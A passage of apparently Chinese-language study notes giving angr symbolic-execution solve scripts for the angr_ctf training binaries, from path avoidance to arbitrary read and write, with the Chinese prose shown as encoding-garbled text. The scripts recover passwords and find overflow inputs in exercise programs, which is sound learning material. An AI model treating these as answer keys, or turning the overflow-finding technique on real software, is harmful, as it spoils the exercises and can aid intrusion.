0x8048000 find_addr = 0x80485E0 avoid_addr = [0x80485A8, 0x80485F2] proj = Project(\u0026#39;./01_angr_avoid\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;: base_addr}) state = proj.factory.entry_state() simgr = proj.factory.simgr(state) simgr.explore(find = find_addr, avoid = avoid_addr) if simgr.found: simulation = simgr.found[0] print (simulation.posix.dumps(0)) else: print (\u0026#34;no result\u0026#34;) æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œå°±æ˜¯å¢åŠ äº†ä¸€ä¸ªavoidå‚æ•°\nfind condition from angr import * proj = Project(\u0026#39;./02_angr_find_condition\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;: 0x8048000}) state = proj.factory.entry_state() simgr = proj.factory.simgr(state) def find_condition(cur_state): output = cur_state.posix.dumps(1) return b\u0026#39;Good Job.\u0026#39; in output def avoid_condition(cur_state): output = cur_state.posix.dumps(1) return b\u0026#39;Try again.\u0026#39; in output simgr.explore(find=find_condition, avoid=avoid_condition) if simgr.found: print (simgr.found[0].posix.dumps(0)) else: print (\u0026#34;no result\u0026#34;) explore ä¸­ï¼Œå¯ä»¥å°†findå’Œavoidçš„å‚æ•°è®¾ç½®ä¸ºå‡½æ•°ï¼Œå½“å„ç§è¾“å‡ºå¤ªå¤šçš„æ—¶å€™ï¼Œè¿™ç§æ–¹æ³•æ¯”è¾ƒçœäº‹ï¼Œè€Œä¸”å¯æ‹“å±•æ€§å¾ˆå¼º\ndumps(1) åˆ™æ˜¯ä»çŠ¶æ€ä¸­è·å–æ ‡å‡†è¾“å‡º\nsymbolic registers symbolicçš„å‡ ä¸ªå®éªŒå°±æ˜¯å¾€åˆå§‹çŠ¶æ€é‡Œæ³¨å…¥ç¬¦å·äº†\nfrom angr import * import claripy proj = Project(\u0026#39;./03_angr_symbolic_registers\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) after_input_addr = 0x8048980 state = proj.factory.blank_state(addr = after_input_addr) user_input = [claripy.BVS(\u0026#39;user_input_%d\u0026#39; % i, 32) for i in range(3)] state.regs.eax = user_input[0] state.regs.ebx = user_input[1] state.regs.edx = user_input[2] find_addr = 0x80489E9 avoid_addr = 0x80489D7 simgr = proj.factory.simgr(state) simgr.explore(find = find_addr, avoid = avoid_addr) if simgr.found: for a in user_input: print (\u0026#39;%x\u0026#39; % simgr.found[0].se.eval(a), end = \u0026#39; \u0026#39;) print () else: print (\u0026#34;no result\u0026#34;) claripy æ˜¯ angr ä¸­çš„çº¦æŸæ±‚è§£å™¨ï¼Œz3 å¥½åƒå°±æ˜¯forkå‡ºæ¥çš„\nä¸»è¦ä½¿ç”¨ state.regs.eax ä¹‹ç±»çš„å°†ç¬¦å·æ³¨å…¥åˆ°å¯„å­˜å™¨ä¸­\nè¿™é‡Œç”¨å¯„å­˜å™¨æ˜¯å› ä¸ºè¾“å…¥è¢«å­˜å‚¨åˆ°äº†å¯„å­˜å™¨ä¸­\nmain å‡½æ•°\n.text:0804897B call get_user_input .text:08048980 mov [ebp+var_14], eax ; state starts here .text:08048983 mov [ebp+var_10], ebx .text:08048986 mov [ebp+var_C], edx get_user_input å†…éƒ¨å®ç°\n.text:0804892F call ___isoc99_scanf .text:08048934 add esp, 10h .text:08048937 mov ecx, [ebp+var_18] .text:0804893A mov eax, ecx .text:0804893C mov ecx, [ebp+var_14] .text:0804893F mov ebx, ecx .text:08048941 mov ecx, [ebp+var_10] .text:08048944 mov edx, ecx å†™è¿™é¢˜çš„æ—¶å€™ï¼Œä¸å°å¿ƒæŠŠ blank_state æ‰“æˆäº† entry_stateï¼Œä½†è¿˜æ˜¯å¯ä»¥å¾—åˆ°æ­£ç¡®ç»“æœï¼Œä¸çŸ¥é“ä¸ºå•¥\nsymbolic stack è¿™é¢˜çš„è¾“å…¥ç›´æ¥å­˜åˆ°äº† stack ä¸­ï¼Œå› æ­¤éœ€è¦æŠŠç¬¦å·æ³¨å…¥åˆ° stack\n.text:08048682 lea eax, [ebp+var_10] ; 2nd input stores here .text:08048685 push eax .text:08048686 lea eax, [ebp+var_C] ; 1st input stores here .text:08048689 push eax .text:0804868A push offset aUU ; \u0026#34;%u %u\u0026#34; .text:0804868F call ___isoc99_scanf .text:08048694 add esp, 10h .text:08048697 mov eax, [ebp+var_C] ; state starts here .text:0804869A sub esp, 0Ch from angr import * import claripy proj = Project(\u0026#39;./04_angr_symbolic_stack\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) after_input_addr = 0x8048697 state = proj.factory.entry_state(addr=after_input_addr) user_input = [claripy.BVS(\u0026#39;input_%d\u0026#39; % i, 32) for i in range(2)] # state.regs.ebp = state.regs.esp state.regs.esp = state.regs.ebp - 8 state.stack_push(user_input[0]) state.stack_push(user_input[1]) simgr = proj.factory.simgr(state) find_addr = 0x80486E4 avoid_addr = 0x80486D2 simgr.explore(find=find_addr, avoid=avoid_addr) if simgr.found: for a in user_input: print (simgr.found[0].se.eval(a), end = \u0026#39; \u0026#39;) print () else: print (\u0026#34;no result\u0026#34;) ç”¨çš„æ–¹æ³•æ˜¯ stack_pushï¼Œæ‰€ä»¥éœ€è¦å…ˆæŠŠ esp è®¾ç½®å¥½\nå‰©ä¸‹çš„åº”è¯¥æ²¡ä»€ä¹ˆå˜åŒ–\nsymbolic memory è¿™é¢˜æ˜¯è¾“å…¥å­˜åˆ°äº† .bss æ®µä¸­\n.text:080485E0 push offset unk_A1BA1D8 .text:080485E5 push offset unk_A1BA1D0 .text:080485EA push offset unk_A1BA1C8 .text:080485EF push offset user_input .text:080485F4 push offset a8s8s8s8s ; \u0026#34;%8s %8s %8s %8s\u0026#34; .text:080485F9 call ___isoc99_scanf .text:080485FE add esp, 20h .text:08048601 mov [ebp+var_C], 0 ; state starts here .text:08048608 jmp short loc_8048637 from angr import * import claripy proj = Project(\u0026#39;./05_angr_symbolic_memory\u0026#39;, main_opts={\u0026#34;base_addr\u0026#34;:0x8048000}) start_addr = 0x8048601 state = proj.factory.blank_state(addr = start_addr) user_input = [claripy.BVS(\u0026#39;input_%d\u0026#39; % i, 8) for i in range(32)] for u in user_input: state.solver.add(u \u0026gt;= 0x20) state.solver.add(u \u0026lt;= 0x7f) mem_addr = 0xA1BA1C0 for i in range(32): state.memory.store(mem_addr + i, user_input[i]) simgr = proj.factory.simgr(state) find_addr = 0x8048672 avoid_addr = 0x804865B simgr.explore(find=find_addr, avoid=avoid_addr) if simgr.found: for i in range(32): if i % 8 == 0 and i != 0: print (\u0026#39; \u0026#39;, end = \u0026#39;\u0026#39;) print (chr(simgr.found[0].se.eval(user_input[i])), end = \u0026#39;\u0026#39;) print () else: print (\u0026#34;no result\u0026#34;) ç”¨çš„æ˜¯ memory.store(store_addr, store_symbolic) æ–¹æ³•\nsymbolic dynamic memory buffer0 = (char *)malloc(9u); buffer1 = (char *)malloc(9u); memset(buffer0, 0, 9u); memset(buffer1, 0, 9u); printf(\u0026#34;Enter the password: \u0026#34;); __isoc99_scanf(\u0026#34;%8s %8s\u0026#34;, buffer0, buffer1, v6); è¿™é¢˜çš„è¾“å…¥å­˜å‚¨åˆ°äº† malloc ä¸­ï¼Œè¿™ä¸ªåœ°å€åŠ¨æ€çš„ï¼Œå¦‚æœä»…ä»…ä½¿ç”¨ memory.store() æ— æ³•ç¡®å®šå­˜å‚¨çš„åœ°å€\nå› æ­¤å…ˆå°† buffer çš„åœ°å€ä¿®æ”¹ä¸ºä¸€ä¸ªè‡ªå®šä¹‰çš„è™šå‡åœ°å€ï¼ˆå› ä¸º buffer åœ¨ .bss æ®µä¸Šï¼Œåœ°å€æ˜¯å›ºå®šçš„ï¼‰ï¼Œç„¶åå¾€è¿™ä¸ªåœ°å€ä¸­å†™å…¥æ•°æ®ï¼Œåç»­ç¨‹åºçš„æ¨¡æ‹Ÿæ‰§è¡Œä¼šä½¿ç”¨è¿™ä¸ªè™šå‡åœ°å€\nfrom angr import * import claripy proj = Project(\u0026#39;./06_angr_symbolic_dynamic_memory\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) state_addr = 0x8048699 state = proj.factory.blank_state(addr = state_addr) buffer0_addr = 0xABCC8A4 buffer1_addr = 0xABCC8AC fake_heap_addr0 = 0xDEADBE00 fake_heap_addr1 = 0xDEADBF00 state.memory.store(buffer0_addr, fake_heap_addr0, endness=proj.arch.memory_endness) state.memory.store(buffer1_addr, fake_heap_addr1, endness=proj.arch.memory_endness) user_input = [claripy.BVS(\u0026#39;input_%d\u0026#39; % i, 8 * 8) for i in range(2)] state.memory.store(fake_heap_addr0, user_input[0]) state.memory.store(fake_heap_addr1, user_input[1]) simgr = proj.factory.simgr(state) find_addr = 0x8048759 avoid_addr = 0x8048747 simgr.explore(find=find_addr, avoid=avoid_addr) if simgr.found: print (simgr.found[0].se.eval(user_input[0], cast_to=bytes).decode(), simgr.found[0].se.eval(user_input[1], cast_to=bytes).decode()) else: print (\u0026#34;no result\u0026#34;) symbolic file è¿™é¢˜æ²¡æœ‰ç”¨é¢„æœŸåšæ³•æ¥åš\nfp = fopen(\u0026#34;OJKSQYDP.txt\u0026#34;, \u0026#34;rb\u0026#34;); fread(buffer, 1u, 0x40u, fp); fclose(fp); unlink(\u0026#34;OJKSQYDP.txt\u0026#34;); æ—¢ç„¶è¿™é‡Œæœ‰ä¸ªä»æ–‡ä»¶è¯»å–ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥æŠŠåˆå§‹çŠ¶æ€è®¾ç½®åˆ°æ–‡ä»¶è¯»å–åé¢ï¼Œé‚£ä¹ˆè¿™é“é¢˜å°±å’Œä¹‹å‰åšè¿‡çš„ symbolic memory ä¸€æ ·äº†\nfrom angr import * import claripy proj = Project(\u0026#39;./07_angr_symbolic_file\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) init_addr = 0x804893C state = proj.factory.blank_state(addr=init_addr) user_input = claripy.BVS(\u0026#39;user_input\u0026#39;, 8 * 8) mem_addr = 0x804A0A0 state.memory.store(mem_addr, user_input) simgr = proj.factory.simgr(state) find_addr = 0x80489B0 avoid_addr = 0x8048996 simgr.explore(find=find_addr, avoid=avoid_addr) if simgr.found: print (simgr.found[0].se.eval(user_input)) else: print (\u0026#39;no result\u0026#39;) constraints è¿™é¢˜çš„è§£æ³•æ˜¯å¯¹è¿ç®—ç»“æœæ‰‹åŠ¨åšçº¦æŸï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆç”¨ä¹‹å‰çš„æ–¹æ³•åšä¸å‡ºæ¥\nfrom angr import * import claripy proj = Project(\u0026#39;./08_angr_constraints\u0026#39;, load_options={\u0026#39;auto_load_libs\u0026#39;:False}, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) start_addr = 0x8048625 start_state = proj.factory.blank_state(addr = start_addr) flag = claripy.BVS(\u0026#39;flag\u0026#39;, 8 * 16) buffer_addr = 0x804A050 start_state.memory.store(buffer_addr, flag) end_addr = 0x804866E simgr = proj.factory.simgr(start_state) simgr.explore(find = end_addr) if simgr.found: end_state = simgr.found[0] calc_res = end_state.memory.load(buffer_addr, 16) cipher = b\u0026#34;AUPDNNPROEZRJWKB\u0026#34; end_state.add_constraints(calc_res == cipher) print (end_state.se.eval(flag, cast_to=bytes)) else: print (\u0026#39;fail\u0026#39;) ä»…æ¨¡æ‹Ÿäº†forå¾ªç¯ï¼ˆåŠ å¯†éƒ¨åˆ†ï¼‰ï¼Œè¿è¡Œç»“æŸåç›´æ¥ä½¿ç”¨ add_constraints æ‰‹åŠ¨æ·»åŠ çº¦æŸæ¡ä»¶\nhook åˆæ¥äº†æ¬¡éé¢„æœŸ\nprintf(\u0026#34;Enter the password: \u0026#34;); __isoc99_scanf(\u0026#34;%16s\u0026#34;, buffer); for ( i = 0; i \u0026lt;= 15; ++i ) *(_BYTE *)(i + 134520916) = complex_function(*(char *)(i + 0x804A054), 18 - i); equals = check_equals_XYMKBKUHNIQYNQXE(buffer, 16); for ( j = 0; j \u0026lt;= 15; ++j ) *(_BYTE *)(j + 0x804A044) = complex_function(*(char *)(j + 134520900), j + 9); __isoc99_scanf(\u0026#34;%16s\u0026#34;, buffer); v3 = equals \u0026amp;\u0026amp; !strncmp(buffer, password, 0x10u); æ˜¾ç„¶ï¼Œè¿™é“é¢˜å¯ä»¥æ‹†æˆä¸¤éƒ¨åˆ†æ¥åšï¼Œç¬¬ä¸€éƒ¨åˆ†ä½¿ç”¨ constraints æ±‚è§£ç¬¬ä¸€æ¬¡è¾“å…¥ï¼›ç¬¬äºŒéƒ¨åˆ†ç›´æ¥è·å– password çš„è¿ç®—ç»“æœ\näºæ˜¯ç›¸å½“äºå†™äº†ä¸¤æ¬¡ angrï¼ˆæ„Ÿè§‰å®Œå…¨å¯ä»¥åˆå¹¶èµ·æ¥ï¼Œä½†ç¨³å¦¥èµ·è§ï¼Œåé¢å†è¯•è¯•ï¼‰\nfrom angr import * import claripy proj = Project(\u0026#39;./09_angr_hooks\u0026#39;) start_state = 0x8048665 user_input = claripy.BVS(\u0026#39;user_input\u0026#39;, 8 * 16) init_state = proj.factory.blank_state(addr = start_state) buffer_addr = 0x804A054 init_state.memory.store(buffer_addr, user_input) simgr = proj.factory.simgr(init_state) end_addr = 0x80486AC simgr.explore(find = end_addr) if simgr.found: solution_state = simgr.found[0] result = solution_state.memory.load(buffer_addr, 16) solution_state.add_constraints(b\u0026#34;XYMKBKUHNIQYNQXE\u0026#34; == result) print (solution_state.solver.eval(user_input, cast_to=bytes).decode()) else: print (\u0026#34;fail\u0026#34;) second_start = 0x80486C0 second_state = proj.factory.blank_state(addr = second_start) second_state.memory.store(0x804A044, b\u0026#34;XYMKBKUHNIQYNQXE\u0026#34;) second_simgr = proj.factory.simgr(second_state) second_simgr.explore(find = 0x8048700) if second_simgr.found: result = second_simgr.found[0].memory.load(0x804A044, 16) print (second_simgr.found[0].solver.eval(result, cast_to=bytes).decode()) else: print (\u0026#34;no result\u0026#34;) è¿è¡Œç»“æœ\nEnter the password: ZXIDRXEORJOTFFJN WUFAOUBLOGLQCCGK Good Job. è¡¥ä¸Šç”¨hookå†™çš„ï¼Œç”¨äº†ä¸¤ç§hookçš„å†™æ³•ï¼ˆçœ‹åˆ°simproceduresé‚£é¢˜æ‰å‘ç°ç¬¬äºŒä¸ªæ˜¯ä¸‹ä¸€é¢˜çš„å†™æ³•ï¼‰\nfrom angr import * import claripy proj = Project(\u0026#39;./09_angr_hooks\u0026#39;) start_state = proj.factory.entry_state() check_addr = 0x80486B3 instraction_len = 5 choose_hook = 1 if choose_hook == 1: @proj.hook(check_addr, length = instraction_len) def replace_check_equal(state): target = b\u0026#39;XYMKBKUHNIQYNQXE\u0026#39; # claripy will convert it to bytes if it is str. input_addr = 0x804A054 cipher = state.memory.load(input_addr, 0x10) state.regs.eax = claripy.If(cipher == target, claripy.BVV(1, 32), claripy.BVV(0, 32)) if choose_hook == 2: class replace_check_equal(SimProcedure): def run(self): target = b\u0026#39;XYMKBKUHNIQYNQXE\u0026#39; input_addr = 0x804A054 cipher = self.state.memory.load(input_addr, 0x10) return claripy.If(cipher == target, claripy.BVV(1, 32), claripy.BVV(0, 32)) check_equal_symbol = \u0026#39;check_equals_XYMKBKUHNIQYNQXE\u0026#39; proj.hook_symbol(check_equal_symbol, replace_check_equal()) simgr = proj.factory.simgr(start_state) def is_success(state): output = state.posix.dumps(1) return b\u0026#39;Good Job.\u0026#39; in output def should_avoid(state): output = state.posix.dumps(1) return b\u0026#39;Try again.\u0026#39; in output simgr.explore(find = is_success, avoid = should_avoid) if simgr.found: print (simgr.found[0].posix.dumps(0)) else: print (\u0026#39;no solution\u0026#39;) simprocedures åŒæ ·å…ˆç”¨ä¹‹å‰çš„æ–¹æ³•å†™äº†ä¸€é\nfrom angr import * import claripy proj = Project(\u0026#39;./10_angr_simprocedures\u0026#39;) start_addr = 0x80486C3 init_state = proj.factory.blank_state(addr = start_addr) init_state.regs.esp = init_state.regs.ebp - 0xD user_input1 = claripy.BVS(\u0026#39;user_input1\u0026#39;, 8 * 4) user_input2 = claripy.BVS(\u0026#39;user_input2\u0026#39;, 8 * 4) user_input3 = claripy.BVS(\u0026#39;user_input3\u0026#39;, 8 * 4) user_input4 = claripy.BVS(\u0026#39;user_input4\u0026#39;, 8 * 4) init_state.stack_push(user_input4) init_state.stack_push(user_input3) init_state.stack_push(user_input2) init_state.stack_push(user_input1) init_state.regs.esp = init_state.regs.ebp - 0x28 simgr = proj.factory.simgr(init_state) check_addr = 0x80499F1 simgr.explore(find = check_addr) ans = b\u0026#34;ORSDDWXHZURJRBDH\u0026#34; if simgr.found: solution_state = simgr.found[0] input_addr = solution_state.regs.ebp - 0x1D result1 = solution_state.memory.load(input_addr, 4) result2 = solution_state.memory.load(input_addr + 4, 4) result3 = solution_state.memory.load(input_addr + 8, 4) result4 = solution_state.memory.load(input_addr + 12, 4) solution_state.add_constraints(ans[:4] == result1) solution_state.add_constraints(ans[4:8] == result2) solution_state.add_constraints(ans[8:12] == result3) solution_state.add_constraints(ans[12:] == result4) print (solution_state.solver.eval(user_input1, cast_to=bytes).decode()[::-1], end = \u0026#39;\u0026#39;) print (solution_state.solver.eval(user_input2, cast_to=bytes).decode()[::-1], end = \u0026#39;\u0026#39;) print (solution_state.solver.eval(user_input3, cast_to=bytes).decode()[::-1], end = \u0026#39;\u0026#39;) print (solution_state.solver.eval(user_input4, cast_to=bytes).decode()[::-1]) else: print (\u0026#34;no result\u0026#34;) ç„¶åç”¨ hook_symbol è¯•è¯•\nfrom angr import * import claripy proj = Project(\u0026#39;./10_angr_simprocedures\u0026#39;) start_state = proj.factory.entry_state() class replace_check_equals(SimProcedure): def run(self, to_check, length): target = b\u0026#39;ORSDDWXHZURJRBDH\u0026#39; result = self.state.memory.load(to_check, length) return claripy.If(result == target, claripy.BVV(1, 32), claripy.BVV(0, 32)) check_equals_sym = \u0026#39;check_equals_ORSDDWXHZURJRBDH\u0026#39; proj.hook_symbol(check_equals_sym, replace_check_equals()) simgr = proj.factory.simgr(start_state) def is_successful(state): output = state.posix.dumps(1) return b\u0026#39;Good Job.\u0026#39; in output def should_abort(state): output = state.posix.dumps(1) return b\u0026#39;Try again.\u0026#39; in output simgr.explore(find = is_successful, avoid = should_abort) if simgr.found: print (simgr.found[0].posix.dumps(0)) else: print (\u0026#39;no result\u0026#39;) sim_scanf simProcedure å…¶å®æ˜¯ angr ç”¨äºç¼“è§£è·¯å¾„çˆ†ç‚¸çš„ä¸€ä¸ªç­–ç•¥ï¼Œå°†ä¸€äº›æœ‰å¯èƒ½å¯¼è‡´è·¯å¾„çˆ†ç‚¸çš„åº“å‡½æ•°è¿›è¡Œäº†é‡å†™ï¼Œç„¶è€Œ angr æä¾›çš„é‡å†™å¯èƒ½å­˜åœ¨ä¸å®Œå–„çš„åœ°æ–¹ï¼Œä¾‹å¦‚ scanf æ— æ³•æ”¯æŒå¤šä¸ªå‚æ•°ï¼Œå› æ­¤è¿™é“é¢˜ç›®ä¸­ï¼Œéœ€è¦è‡ªå·±é‡å†™ scanf çš„ SimProcedureï¼Œå®ç°æ¥æ”¶ä¸¤ä¸ªå‚æ•°\nè¿™é“é¢˜ä¸»è¦å­¦åˆ°çš„å°±æ˜¯åˆ©ç”¨ globals å­˜å‚¨æ³¨å…¥çš„ç¬¦å·\nfrom angr import * import claripy proj = Project(\u0026#39;./11_angr_sim_scanf\u0026#39;) start_state = proj.factory.entry_state() start_state.globals[\u0026#39;inputs\u0026#39;] = [] class replace_scanf(SimProcedure): def run(self, fmt, input1, input2): user_input1 = claripy.BVS(\u0026#39;user_input1\u0026#39;, 32) user_input2 = claripy.BVS(\u0026#39;user_input2\u0026#39;, 32) self.state.memory.store(input1, user_input1, endness = proj.arch.memory_endness) self.state.memory.store(input2, user_input2, endness = proj.arch.memory_endness) self.state.globals[\u0026#39;inputs\u0026#39;].append((user_input1, user_input2)) scanf_sym = \u0026#34;__isoc99_scanf\u0026#34; proj.hook_symbol(scanf_sym, replace_scanf()) simgr = proj.factory.simgr(start_state) def is_success(state): output = state.posix.dumps(1) return b\u0026#39;Good Job.\u0026#39; in output def should_avoid(state): output = state.posix.dumps(1) return b\u0026#39;Try again.\u0026#39; in output simgr.explore(find = is_success, avoid = should_avoid) if simgr.found: solution_state = simgr.found[0] for res in solution_state.globals[\u0026#39;inputs\u0026#39;]: print (solution_state.solver.eval(res[0]), end=\u0026#39; \u0026#39;) print (solution_state.solver.eval(res[1])) else: print (\u0026#39;no result\u0026#39;) veritesting è®¾ç½® simulation_manager æ—¶ï¼Œå¯ç”¨ veritesting å¯ä»¥ç¼“è§£ä¸€å®šç¨‹åº¦çš„è·¯å¾„çˆ†ç‚¸\nfrom angr import * import claripy proj = Project(\u0026#39;./12_angr_veritesting\u0026#39;) start_state = proj.factory.entry_state() simgr = proj.factory.simgr(start_state, veritesting=True) def is_success(state): output = state.posix.dumps(1) return b\u0026#39;Good\u0026#39; in output def should_avoid(state): output = state.posix.dumps(1) return b\u0026#39;Try\u0026#39; in output simgr.explore(find = is_success, avoid = should_avoid) if simgr.found: print (simgr.found[0].posix.dumps(0)) else: print (\u0026#39;No result\u0026#39;) ç®€å•å­¦ä¹ äº†ä¸€ä¸‹ veritesting çš„åŸç†ï¼Œåœ¨æœ¬é¢˜ç›®çš„éªŒè¯ç¯èŠ‚ï¼Œä»£ç ä¸º\nfor (int i=0; i\u0026lt;32; ++i) { if (buffer[i] == complex_function(${ write(\u0026#39;\\\u0026#39;\u0026#39; + letter0 + \u0026#39;\\\u0026#39;\u0026#39; ) }$, i + ${ write(integer) }$) ) { counter0++; } } å¦‚æœå•çº¯ä»¥åˆ†æ”¯å›¾æ¥è¯ï¼Œæ€»å…±å¼•å…¥äº† $2^{32}$ ç§å¯èƒ½ï¼Œç„¶è€Œäº‹å®ä¸Šåªæœ‰æ»¡è¶³å’Œä¸æ»¡è¶³ä¸¤ç§æƒ…å†µ\nå¼€å¯ veritesting åï¼Œangrä¼šåœ¨é‡åˆ°åŸºç¡€ä»£ç ï¼ˆæ— ç³»ç»Ÿè°ƒç”¨ï¼Œé—´æ¥è·³è½¬ç­‰è¯­å¥ï¼‰æ—¶ï¼Œä»åŠ¨æ€ç¬¦å·æ‰§è¡Œï¼ˆä¸ºæ¯ä¸€æ¡è·¯å¾„ç”Ÿæˆä¸€ä¸ªè¡¨è¾¾å¼ï¼‰åˆ‡æ¢åˆ°é™æ€ç¬¦å·æ‰§è¡Œï¼ˆå°†ç¨‹åºè½¬æ¢ä¸ºè¡¨è¾¾å¼ï¼‰ã€‚å› æ­¤ï¼Œåœ¨æ‰§è¡Œè¿™ä¸ªå¾ªç¯æ—¶ï¼Œå…ˆåŠ¨æ€æ¢å¤æ§åˆ¶æµå›¾ï¼Œæ‰¾åˆ°é™æ€ç¬¦å·æ‰§è¡Œå®¹æ˜“åˆ†æå’Œéš¾ä»¥åˆ†æçš„è¯­å¥ï¼Œå¹¶æ¨æ–­å‡ºæ˜“åˆ†æèŠ‚ç‚¹åˆ°éš¾åˆ†æèŠ‚ç‚¹çš„å½±å“ï¼Œæœ€ååˆ‡æ¢å›åŠ¨æ€åˆ†ææ¥å¤„ç†ä¸æ˜“å¤„ç†çš„æƒ…å†µã€‚\nstatic binary åœ¨ sim_scanf ä¸­è¯´åˆ°ï¼Œangr å°†éƒ¨åˆ†åº“å‡½æ•°æ›¿æ¢ä¸ºè‡ªå·±å®ç°çš„ SimProcedures æ¥é¿å…è·¯å¾„çˆ†ç‚¸ï¼Œä½†å½“é‡åˆ°é™æ€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œç”±äºæ²¡æœ‰è°ƒç”¨åº“å‡½æ•°ï¼Œè¿™äº›é™æ€çš„å‡½æ•°å°±æœ‰å¯èƒ½é€ æˆè·¯å¾„çˆ†ç‚¸ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ›¿æ¢ä¸º SimProcedures\nfrom angr import * proj = Project(\u0026#39;./13_angr_static_binary\u0026#39;) start_state = proj.factory.entry_state() proj.hook(0x804ED40, SIM_PROCEDURES[\u0026#39;libc\u0026#39;][\u0026#39;printf\u0026#39;]()) proj.hook(0x804ED80, SIM_PROCEDURES[\u0026#39;libc\u0026#39;][\u0026#39;scanf\u0026#39;]()) proj.hook(0x804F350, SIM_PROCEDURES[\u0026#39;libc\u0026#39;][\u0026#39;puts\u0026#39;]()) proj.hook(0x8048D10, SIM_PROCEDURES[\u0026#39;glibc\u0026#39;][\u0026#39;__libc_start_main\u0026#39;]()) simgr = proj.factory.simgr(start_state, veritesting = True) def is_success(state): output = state.posix.dumps(1) return b\u0026#39;Good Job.\u0026#39; in output def should_avoid(state): output = state.posix.dumps(1) return b\u0026#39;Try again.\u0026#39; in output simgr.explore(find = is_success, avoid = should_avoid) if simgr.found: solution = simgr.found[0] print (solution.posix.dumps(0)) else: print (\u0026#39;No result\u0026#39;) shared library è¿™é“é¢˜ç›®å°†åŠ å¯†éƒ¨åˆ†æ”¾åˆ°äº† so æ–‡ä»¶ä¸­ï¼Œå› æ­¤éœ€è¦æ‰§è¡Œ so æ–‡ä»¶\nåœ¨æ‰§è¡Œæ—¶é‡åˆ°çš„é—®é¢˜æœ‰\nåŸºåœ°å€ä¸ç¡®å®šï¼šä½¿ç”¨ base_addr æ¥æ§åˆ¶ç¨‹åºçš„åŸºåœ°å€ ç¬¦å·æ³¨å…¥çš„åœ°å€æœªçŸ¥ï¼šä½¿ç”¨ call_state æ¥æ§åˆ¶å‡½æ•°è°ƒç”¨æ—¶çš„å‚æ•° from angr import * import claripy base_addr = 0x400000 proj = Project(\u0026#39;./lib14_angr_shared_library.so\u0026#39;, main_opts={\u0026#39;base_addr\u0026#39;:base_addr}) store_addr = 0x300000 init_state = proj.factory.call_state(base_addr + 0x6d7, store_addr, claripy.BVV(8, 32)) user_input = claripy.BVS(\u0026#39;user_input\u0026#39;, 8 * 8) init_state.memory.store(store_addr, user_input, endness = proj.arch.memory_endness) find_addr = base_addr + 0x775 simgr = proj.factory.simgr(init_state) simgr.explore(find = find_addr) if simgr.found: solution = simgr.found[0] solution.add_constraints(solution.regs.eax != 0) print (solution.solver.eval(user_input, cast_to=bytes)) else: print (\u0026#39;no result\u0026#39;) arbitrary read è¿™é“é¢˜æœ‰äº›å¤æ‚ï¼Œç”±äºéœ€è¦è®©è¾“å…¥çš„éƒ¨åˆ†æº¢å‡ºï¼Œæ§åˆ¶ puts çš„è¾“å‡ºå‚æ•°\nåŒæ ·éœ€è¦æ›¿æ¢ scanfï¼ŒåŒæ—¶ï¼Œè¿™é“é¢˜ç›®ä¸ºäº†å‡å°è¾“å…¥çš„å¯èƒ½æ€§ï¼Œéœ€è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸‹å¯¹è¾“å…¥çš„çº¦æŸï¼Œè¦æ±‚åœ¨å¯è§å­—ç¬¦èŒƒå›´å†…\nfrom angr import * import claripy proj = Project(\u0026#39;./15_angr_arbitrary_read\u0026#39;) init_state = proj.factory.entry_state() class replace_scanf(SimProcedure): def run(self, fmt, key_addr, stack_addr): user_input1 = claripy.BVS(\u0026#39;user_input1\u0026#39;, 32) user_input2 = claripy.BVS(\u0026#39;user_input2\u0026#39;, 20 * 8) for i in user_input2.chop(bits = 8): self.state.add_constraints(i \u0026gt; 0x20) self.state.add_constraints(i \u0026lt; 0x80) self.state.memory.store(key_addr, user_input1, endness = proj.arch.memory_endness) self.state.memory.store(stack_addr, user_input2) self.state.globals[\u0026#39;solutions\u0026#39;] = (user_input1, user_input2) proj.hook_symbol(\u0026#39;__isoc99_scanf\u0026#39;, replace_scanf()) simgr = proj.factory.simgr(init_state) def check_puts(state): output_addr = state.memory.load(state.regs.esp + 4, 4, endness = proj.arch.memory_endness) if not state.solver.symbolic(output_addr): return False FLAG = output_addr == 0x484F4A47 copy_state = state.copy() copy_state.add_constraints(FLAG) if copy_state.satisfiable(): state.add_constraints(FLAG) return True return False def is_success(state): puts_addr = 0x8048370 if state.addr == puts_addr: return check_puts(state) else: return False simgr.explore(find = is_success) if simgr.found: solution = simgr.found[0] user_input1, user_input2 = solution.globals[\u0026#39;solutions\u0026#39;] print (solution.solver.eval(user_input1), solution.solver.eval(user_input2, cast_to=bytes).decode()) else: print (\u0026#34;No result\u0026#34;) ä¸æ˜¯å¾ˆç†è§£çš„åœ°æ–¹æ˜¯ï¼Œä¸ºä»€ä¹ˆè¦å…ˆæ·»åŠ åˆ¤æ–­è¿™ä¸ª constraints æ˜¯å¦æ»¡è¶³ï¼Œç„¶åå†æ·»åŠ åˆ° state ä¸­\narbitrary write æ€è·¯å’Œä¸Šä¸€é¢˜æ¯”è¾ƒæ¥è¿‘ï¼Œè¿™æ¬¡ä½¿ç”¨äº† strncpy å‡½æ•°çš„å‚æ•°ä½œä¸ºæ£€æŸ¥\né‡åˆ°çš„ä¸€ä¸ªé—®é¢˜æ˜¯ BV æ•°æ®ç±»å‹åœ¨é€‰æ‹©éƒ¨åˆ†æ•°æ®ä¸Šçš„é—®é¢˜\nfrom angr import * import claripy proj = Project(\u0026#39;./16_angr_arbitrary_write\u0026#39;) start_state = proj.factory.entry_state() class replace_scanf(SimProcedure): def run(self, fmt, key_addr, s_addr): user_input1 = claripy.BVS(\u0026#39;user_input1\u0026#39;, 32) user_input2 = claripy.BVS(\u0026#39;user_input2\u0026#39;, 8 * 20) for c in user_input2.chop(bits = 8): self.state.add_constraints(c \u0026gt; 0x20) self.state.add_constraints(c \u0026lt; 0x7f) self.state.memory.store(key_addr, user_input1, endness = proj.arch.memory_endness) self.state.memory.store(s_addr, user_input2) 